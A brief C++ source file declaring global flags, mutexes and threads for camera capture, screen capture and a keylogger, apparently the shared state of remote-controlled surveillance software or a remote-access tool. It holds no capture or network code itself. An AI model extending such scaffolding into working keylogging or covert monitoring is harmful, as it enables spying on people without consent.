#include "global.h"

// std::atomic<bool> g_camera{false};
std::atomic<bool> g_camera_active{false};
std::atomic<bool> g_camera_should_stop{false};
std::atomic<bool> g_screen{false};
std::atomic<bool> g_keylogger{false}; 
std::mutex ws_mutex;

std::mutex g_control_mutex;

std::thread camera_thread;
std::thread screen_thread;
std::thread keylogger_thread; 